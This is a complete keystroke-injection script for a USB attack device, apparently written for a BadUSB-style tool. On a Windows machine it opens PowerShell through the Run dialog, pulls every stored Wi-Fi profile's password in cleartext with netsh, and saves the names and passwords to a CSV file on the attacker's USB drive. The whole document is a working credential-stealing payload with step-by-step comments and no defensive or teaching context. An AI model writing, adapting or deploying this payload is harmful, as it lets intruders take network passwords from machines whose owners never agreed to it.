layout('us'); // Use US keyboard layout
typingSpeed(0, 0); // Set typing speed to fastest

press("GUI r"); // Press Windows key + R to open the Run dialog
delay(500);
type("powershell\n"); // Open PowerShell
delay(1500);

// Step 1: Find the removable USB drive automatically
type('$usbDrive = Get-WmiObject -Query "SELECT * FROM Win32_LogicalDisk WHERE DriveType=2" | Select-Object -ExpandProperty DeviceID\n');
delay(500);

// Step 2: Ensure USB drive is detected before proceeding
type('if ($usbDrive) {\n');
delay(500);

// Step 3: Get all Wi-Fi profiles
type('    $profiles = netsh wlan show profiles | Select-String "\\: (.+)" | ForEach-Object { $_.Matches.Groups[1].Value }\n');
delay(500);

// Step 4: Create a new CSV file with headers
type('    $csvPath = "$usbDrive\\wifipass.csv"\n');
type('    "WiFiProfile,WiFiPassword" | Out-File -FilePath $csvPath -Encoding UTF8\n');
delay(500);

// Step 5: Loop through each profile and extract the password
type('    foreach ($profile in $profiles) {\n');
delay(500);
type('        $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content\\W+\\:(.+)" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }\n');
delay(500);
type('        "$profile,$password" | Out-File -FilePath $csvPath -Append -Encoding UTF8\n');
delay(500);
type('    }\n');
delay(500);

// Step 6: Confirm the data is stored successfully
type('    Write-Output "Wi-Fi passwords stored successfully on $csvPath"\n');
type('} else {\n');
type('    Write-Output "USB drive not found. Please connect the drive and try again."\n');
type('}\n');
delay(500);
type("\n");

